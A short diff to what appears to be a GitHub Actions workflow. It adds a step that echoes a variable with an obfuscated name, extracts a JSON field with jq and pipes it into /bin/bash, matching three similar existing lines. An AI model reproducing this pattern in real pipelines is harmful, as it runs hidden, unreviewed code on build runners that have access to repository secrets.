@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$f2" | jq -r .ezop79339 | /bin/bash
           printf '%s' "$w7" | jq -r .h3 | /bin/bash
           printf '%s' "$o7140" | jq -r .shu36235 | /bin/bash
+          echo $dfhv8954 | jq -r .b8452 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
